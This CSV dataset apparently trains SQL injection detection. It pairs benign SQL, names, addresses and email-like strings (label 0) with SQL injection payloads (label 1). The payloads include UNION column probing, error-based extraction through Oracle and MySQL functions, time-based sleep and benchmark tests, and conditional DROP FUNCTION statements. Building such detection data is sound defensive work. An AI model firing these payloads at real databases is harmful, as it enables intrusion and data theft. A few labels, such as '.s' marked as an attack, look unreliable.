Query,Label
molledo basagaa,0
nahuel,0
olmos de ojeda,0
-7742  )   as tgzq where 7842  =  7842 or 2062  =  1563,1
SELECT * FROM can,0
"1""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""pdsy"" like ""pdsy",1
"-9082 union all select 9858,9858,9858,9858,9858,9858--",1
SELECT * FROM mouth WHERE copy = 'universe'  OR done = 'men',0
"urbanitzacio europa-fuentes de san bernabe s/n,",0
"1""  )   as cfed where 8220  =  8220 union all select null,null,null,null,null,null,null,null,null#",1
SELECT angle ( s )  FROM identity FULL OUTER JOIN,0
"1""  )   where 1614  =  1614 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
"1""   )    )    as nhus where 3689  =  3689",1
7.6744E+15,0
"  SELECT MAKETIME ( 16,   1, 0 ) ;",0
toba,0
if  (  6767  =  5022  )   select 6767 else drop function buii--,1
"1""   )    )    as tgwp where 9405  =  9405",1
"1%'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   '%'  =  '",1
"1'   )    )     )   union all select null,null,null,null,null,null,null#",1
SELECT TOP 50 PERCENT * FROM receive,0
zael,0
"1%"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""%""  =  """,1
"1"" where 3692  =  3692 union all select null,null--",1
herminda,0
"1"" where 4991  =  4991 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'fgcg'  =  'fgcg",1
"1'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT * FROM split WHERE letter = 'fur'  OR applied = 'most',0
lue39,0
SELECT * FROM expect WHERE nest BETWEEN '1996-07-01' AND '1996-07-31',0
DELETE FROM thought WHERE black = 'declared',0
"-3361 where 1335  =  1335 or elt  (  5891  =  5092,5092  )  --",1
SELECT * FROM minerals WHERE    NOT old = 'down',0
"-5703'  )   or elt  (  2972  =  8708,8708  )  ",1
SELECT TOP 3 * FROM package WHERE surface = 'mistake' SELECT * FROM learn,0
"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'vunt'  =  'vunt",1
SELECT * FROM clothing WHERE prove = 'east',0
"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",1
"-7518"" or elt  (  8413  =  3995,3995  )   and ""cpnf""  =  ""cpnf",1
"  SELECT ifID AS ID, friendly AS care FROM card",0
"1"" and 4288  =  3696 and ""qqam"" like ""qqam",1
"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",1
teruel,0
6.20274E+15,0
autonell,0
armaanzas,0
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'bmhw' like 'bmhw,1
"1""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""msjh"" like ""msjh",1
DELETE FROM page,0
"1""  )   where 2656  =  2656 or sleep  (  5  )  --",1
tripicallero,0
"-2168""   )    )    union all select 4935,4935,4935,4935,4935,4935,4935,4935,4935--",1
" SELECT column_name ( s )  FROM jet,path",0
SELECT * FROM agree WHERE impossible = 'fur',0
"  SELECT will,suit,green FROM damage LEFT JOIN Orders ON rod.pineID =  outer.ask ORDER BY pipe.brought",0
"  SELECT business,meal FROM happen WHERE swing = 'mind' UNION SELECT cheese, toward FROM rod",0
SELECT * FROM rest,0
6i4t562e7a,0
SELECT AVG ( funny ) FROM around,0
SELECT correctly ( s ) FROM wave INNER JOIN,0
-8553'+  (  select adko where 1750  =  1750 union all select 1750#,1
SELECT COUNT ( today ) FROM atomic,0
SELECT cheese ( s )  FROM daughter SELECT grass FROM soft,0
"palomares, 2 11b",0
"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"  SELECT sale,fewer,taught FROM stems LEFT JOIN Orders ON law.bicycleID =  fifty.thy ORDER BY rapidly.fastened",0
SELECT life FROM bar,0
SELECT * FROM window WHERE coffee = 'tide',0
3.68572E+15,0
SELECT * FROM tell WHERE article = 'value' LIMIT 3,0
-4557%'   )    )    or 4537  =  3401 and    (    (   '%'  =  ',1
"  SELECT Orders.seriesrID, Employees.leg, Employees.serve FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.trainID ORDER BY Orders.briefID",0
"1 where 8949  =  8949 and make_set  (  8403  =  8403,8899  )  --",1
olivares,0
SELECT COUNT ( simply )  FROM standard,0
SELECT * FROM stomach WHERE Price NOT BETWEEN 10 AND 20,0
"1',extractvalue  (  9788,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9788  =  9788,1   )    )     )  ,0x717a767a71   )    )   ",1
"-5637%""   )    )     )   or 6872  =  6872 and    (    (     (  ""%""  =  """,1
if  (  8284  =  6171  )   select 8284 else drop function mbih--,1
"   SELECT anybody, rough+ ', ' + wide+ ' ' + laid+ ', ' + folks AS yet  FROM clay",0
"1%'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   '%'  =  '",1
78739097t,0
SELECT COUNT ( machinery ) FROM unknown,0
1' and 2006  =  2006,1
SELECT column_name FROM table1 INNER JOIN table2 ON table1.column_name  =  table2.column_name ;,0
"  SELECT partly,roll FROM government WHERE thing = 'five' UNION SELECT help, doing FROM farmer",0
SELECT COUNT ( DISTINCT no )  FROM there,0
SELECT * FROM dot WHERE broken = 'mine' FETCH FIRST 3 ROWS ONLY,0
-5356'  )   or 9323  =  9323#,1
"-3525"" where 3522  =  3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#",1
felipa,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 179 )  ORDER BY meta_id ASC",0
"1  )   as wvpl where 9791  =  9791 and make_set  (  3491  =  9067,9067  )  --",1
 UPDATE now SET kind = 'avoid'WHERE lot = 'his',0
04607227m,0
"-6129 union all select 9122,9122#",1
97728451w,0
"  SELECT DAYNAME ( ""2017-06-15"" ) ;",0
"   SELECT world, dress, killFROM station WHERE letter  IS NOT NULL",0
"INSERT INTO shelter  ( third, disease, dance )  VALUES  ( 'cause', 'wrote', 'eight' )  ",0
"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
1'   )    )    as kgfp where 2366  =  2366,1
"SELECT * FROM clothes WHERE father BETWEEN ""goose"" AND    ""certain""",0
SELECT AVG ( our ) FROM wise SELECT SUM ( outer ) ,0
"1   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
1'||  (  select 'fven' where 1433  =  1433 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ||',1
"1'+  (  select llcl where 8188  =  8188 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM straw WHERE shore NOT BETWEEN 'meat' AND 'port',0
1%' union all select null#,1
scheppan-ishikawa@tuslimites.ly,0
compte,0
"1' and elt  (  2266  =  7467,7467  )  ",1
SELECT * FROM progress ORDER BY court DESC,0
"-4746%""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,1
-8652'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
"-2216   )    )    as hxmq where 5677  =  5677 union all select 5677,5677--",1
select sleep  (  5  )   and 'hhrw' like 'hhrw,1
1%' and   (  2439  =  2555  )  *2555 and '%'  =  ',1
15553,0
"1'  )   union all select null,null,null,null,null,null,null--",1
SELECT wing ( s FROM satisfied RIGHT JOIN,0
"-9929'  )   as gbtc where 8162  =  8162 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"   SELECT COUNT ( paid ) , cent FROM musical BY my",0
11690,0
"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
SELECT * FROM tightly WHERE negative  BETWEEN 10 AND 20,0
"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",1
orazio,0
SELECT * FROM tone WHERE swimming = 'rapidly'  AND City = 'huge',0
canela,0
"   SELECT white,breeze,beneath,per,surface     (  (  feed JOIN experience ON facing.sign =  bend.doing )   INNER JOIN simpleON Orders.poor =  stand.forwardID ) ",0
SELECT * FROM buffalo,0
"-8021'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cenk' like 'cenk",1
"1 where 6040  =  6040 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"calle san isidro labrador 188, 13?h",0
SELECT TOP 50 PERCENT * FROM instrument SELECT * FROM news FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM electric,0
bosier@opel-e-flex.bn,0
galimany bifet,0
1' where 2389  =  2389 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"  SELECT gas,tree FROM review WHERE question = 'today' UNION SELECT old, charge FROM average",0
"1  )   where 5598  =  5598 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",1
"c/ plza. 18, 6-e",0
SELECT * FROM let ORDER BY wave,0
berber,0
SELECT * FROM act WHERE believed = 'judge'  OR come = 'rose',0
SELECT behind ( s )  FROM last SELECT dawn ( s ) ,0
crabe,0
vilmanse80,0
SELECT TOP 3 * FROM paint WHERE change = 'metal',0
SELECT AVG ( load ) FROM mountain SELECT SUM ( write ) ,0
SELECT COUNT ( height ) FROM studying,0
SELECT * FROM me WHERE affect = 'percent',0
"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""dyoe""  =  ""dyoe",1
"-3737%"" union all select 4452,4452,4452#",1
"  SELECT GREATEST ( ""w3Schools.com"", ""microsoft.com"", ""apple.com"" ) ;",0
"-5024%"" or make_set  (  3321  =  7355,7355  )   and ""%""  =  """,1
lowietje,0
SELECT * FROM steep  WHERE start NOT LIKE '[met]%',0
"   SELECT ride,protection,beauty,horn,native     (  (  finger JOIN bad ON play.review =  paper.hit )   INNER JOIN spokenON Orders.income =  instant.appliedID ) ",0
tracisto arroyave,0
71579092x,0
"lugar higuera canaria, 169",0
"   SELECT brought, worth, lady FROM stand WHERE current  IS NULL",0
.s,1
nogueras,0
SELECT * FROM motion ORDER BY fat DESC,0
"   SELECT grade, reason, automobileFROM no WHERE obtain  IS NOT NULL",0
1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'pziy'  =  'pziy,1
SELECT AVG ( similar ) FROM cutting,0
"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",1
SELECT * FROM place,0
SELECT * FROM bit WHERE voice = 'golden' FETCH FIRST 3 ROWS ONLY,0
38623329g,0
incrdu69,0
DELETE FROM pan WHERE halfway = 'range',0
"-9432   )    )    as nqya where 8387  =  8387 or elt  (  9242  =  6180,6180  )  --",1
SELECT * FROM  ( SELECT verb FROM occasionally ) ,0
SELECT * FROM whether WHERE    NOT shout = 'instant',0
SELECT * FROM play ORDER BY taught DESC,0
SELECT drove,0
"-1280"" union all select 8602,8602,8602,8602,8602,8602,8602,8602,8602,8602#",1
SELECT * FROM support WHERE court = 'youth' FETCH FIRST 3 ROWS ONLY,0
1'   )    )    as jbcd where 9078  =  9078 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1
-4906'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'pkrq'  =  'pkrq,1
8.27055E+15,0
"calle ginebra, 138",0
"1' in boolean mode  )   and make_set  (  7804  =  3315,3315  )  #",1
"  UPDATE occur SET swung =  'crack', City =  'tonight' WHERE disease =  building",0
41110,0
SELECT MIN ( bag )  AS engineer FROM jump,0
"1   )    )    as qgok where 3993  =  3993 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1
SELECT COUNT ( report ) FROM memory,0
SELECT * FROM sell WHERE money = 'noted',0
" SELECT column_name ( s )  FROM finest,develop",0
"-2726""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""ococ""  =  ""ococ",1
roe,0
SELECT * FROM control WHERE telephone NOT LIKE '[unless]%',0
1  )   where 8041  =  8041,1
ludwig_schuster@viavilano.web,0
"1 where 2823  =  2823 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT * FROM spider FETCH FIRST 50 PERCENT ROWS ONLY,0
"1%""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",1
"-5728  )   where 8663  =  8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#",1
osada,0
SELECT * FROM bridge,0
1' in boolean mode  )   and 4457  =  3885#,1
SELECT FLOOR ( 25.75 ) ;,0
select case when 6662  =  9889 then 1 else null end--,1
70679983v,0
SELECT * FROM  ( SELECT explanation FROM spin ) ,0
1'   )    )    and 3526  =  1354,1
SELECT * FROM reason WHERE again = 'string',0
"1""   )    )    as gqxk where 9199  =  9199 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1
"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and ""lxfm""  =  ""lxfm",1
cela uba,0
sineiro herranz,0
ag2u7a,0
agalladura,0
"1%' union all select null,null--",1
"   SELECT COUNT ( uncle ) , day FROM family BY instant",0
" select * from users where id  =  1 union select 1a#,banner from v$version where rownum  =  1 -- 1",1
SELECT * FROM final  WHERE salmon NOT LIKE '[ship]%',0
"1'   )    )    as kgiw where 7452  =  7452 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-7749"" or   (  2689  =  7481  )  *7481",1
SELECT * FROM throat FETCH FIRST 3 ROWS ONLY,0
"1%""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""%""  =  """,1
stiefel8@spainbareback.eu,0
alfajarn,0
retasac5n,0
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,1
baladora,0
"1%'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%'  =  '",1
SELECT * FROM personal WHERE sink = 'nation',0
servitje areggiani,0
corulln,0
ermina,0
"fivasa, 15,",0
SELECT * FROM more WHERE discover = 'part'  OR cent = 'silent',0
"-5802'   )    )     )   union all select 6286,6286,6286,6286#",1
" SELECT Orders.OrderID, Orders.OrderDate, Customers.CustomerName FROM Customers, Orders WHERE Customers.CustomerName = 'Around the Horn' AND Customers.CustomerID = Orders.CustomerID;",0
"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""dppw"" like ""dppw",1
caabate liano,0
36914497a,0
6660,0
6.5524E+15,0
" SELECT column_name ( s )  FROM sport,accurate",0
"  UPDATE vapor SET pile =  'return', City =  'land' WHERE solve =  longer",0
